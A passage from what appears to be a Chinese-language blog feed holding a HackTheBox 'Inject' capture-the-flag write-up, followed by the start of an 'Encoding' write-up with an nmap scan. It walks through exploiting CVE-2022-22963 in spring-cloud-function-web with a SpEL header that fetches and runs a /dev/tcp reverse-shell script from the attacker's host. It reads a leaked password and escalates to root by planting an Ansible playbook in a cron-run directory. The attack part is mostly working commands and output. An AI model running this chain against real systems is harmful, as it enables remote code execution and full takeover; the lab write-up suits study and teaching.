class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java.version</span>&gt;</span>11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.activation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.activation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-function-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>webjars-locator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;parent.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">finalName</span>&gt;</span>spring-webapp<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>spring-cloud-function-web 3.2.2存在RCE漏洞</p><blockquote><p><a href="https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities">https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities</a><br /><a href="https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py">https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py</a></p></blockquote><p>构造EXP并触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">python -m http.server 80&amp;</span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl http://10.10.*.*/BFL -o /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br></pre></td></tr></table></figure><p>获得反弹Shell</p><p>得到<code>phil</code>账号信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/frank/.m2/settings.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>Inject<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>phil<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>DocPhillovestoInject123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">privateKey</span>&gt;</span>$&#123;user.home&#125;/.ssh/id_dsa<span class="tag">&lt;/<span class="name">privateKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filePermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">filePermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directoryPermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">directoryPermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切换账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su phil</span><br><span class="line">DocPhillovestoInject123</span><br></pre></td></tr></table></figure><p>获取tty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21440ad399cf843bcf64f2f7fa9ff600</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1001(phil) gid&#x3D;1001(phil) groups&#x3D;1001(phil),50(staff)</span><br></pre></td></tr></table></figure><p>staff组权限</p><p>查看staff组权限相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group staff -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">183353      4 drwxrwxr-x   2 root     staff        4096 Mar 20 16:02 &#x2F;opt&#x2F;automation&#x2F;tasks</span><br></pre></td></tr></table></figure><p>下载pspy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>获取pspy并运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.16.8/pspy64 -o /tmp/pspy64</span><br><span class="line">chmod +x /tmp/pspy64</span><br><span class="line">/tmp/pspy64</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3720   | sleep 10 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3718   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3717   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ansible-parallel &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;*.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3716   | &#x2F;bin&#x2F;sh -c sleep 10 &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;rm -rf &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;* &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;cp &#x2F;root&#x2F;playbook_1.yml &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3715   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3714   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:01 CMD: UID&#x3D;0     PID&#x3D;3722   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3732   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3728   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:02 CMD: UID&#x3D;0     PID&#x3D;3733   | &#x2F;lib&#x2F;systemd&#x2F;systemd-udevd </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3748   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3747   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3746   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3751   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3755   | &#x2F;usr&#x2F;bin&#x2F;python3 -Es &#x2F;usr&#x2F;bin&#x2F;lsb_release -a </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3759   | &#x2F;usr&#x2F;bin&#x2F;lspci -D </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3771   | &#x2F;sbin&#x2F;vgs --noheadings --nosuffix --units g --separator , </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:03 CMD: UID&#x3D;0     PID&#x3D;3773   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329082.6908467-3728-2496817511178&#x2F;AnsiballZ_setup.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3799   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;ansible-playbook &#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;playbook_1.yml </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3818   | &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3817   | &#x2F;bin&#x2F;sh -c &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0 </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:04 CMD: UID&#x3D;0     PID&#x3D;3816   | &#x2F;bin&#x2F;sh -c &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;root&#x2F;.ansible&#x2F;tmp&#x2F;ansible-tmp-1679329084.3736737-3799-18648848213699&#x2F;AnsiballZ_systemd.py &amp;&amp; sleep 0&#39; </span><br><span class="line">2023&#x2F;03&#x2F;20 16:18:05 CMD: UID&#x3D;0     PID&#x3D;3820   | &#x2F;usr&#x2F;bin&#x2F;systemctl show webapp</span><br></pre></td></tr></table></figure><p>这里只能ctrl+c退掉shell然后再弄个shell</p><blockquote><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/</a></p></blockquote><p>构造BFL.yml如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">RShell</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">bash</span> <span class="string">/tmp/BFL_root</span></span><br></pre></td></tr></table></figure><p>写入至<code>/opt/automation/tasks/BFL.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;LSBob3N0czogbG9jYWxob3N0CiAgdGFza3M6CiAgICAtIG5hbWU6IFJTaGVsbAogICAgICBjb21tYW5kOiBiYXNoIC90bXAvQkZMX3Jvb3Q=&quot;</span> | base64 -d &gt; /opt/automation/tasks/BFL.yml</span><br></pre></td></tr></table></figure><p>构造触发目标反弹Shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9997 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL_root</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>获取bash脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.*.*/BFL_root -o /tmp/BFL_root</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>计划任务<code>/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code>触发<code>/opt/automation/tasks/BFL.yml</code>再触发<code>/tmp/BFL_root</code>实现反弹Shell</p><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b326b1361a10a45872887e9aaf6352b</span><br></pre></td></tr></table></figure><hr /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh phil@10.10.11.204</span><br><span class="line">phil@10.10.11.204<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">DenyUsers phil</span><br></pre></td></tr></table></figure><p>嗯</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Encoding</title>
    <link href="https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/"/>
    <id>https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/</id>
    <published>2023-03-20T16:58:11.000Z</published>
    <updated>2023-03-20T17:15:00.250Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_encoding"><a class="markdownIt-Anchor" href="#hackthebox_encoding"></a> HackTheBox_Encoding</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.198</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.198</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>在站点中获得域名信息<code>haxtables.htb</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 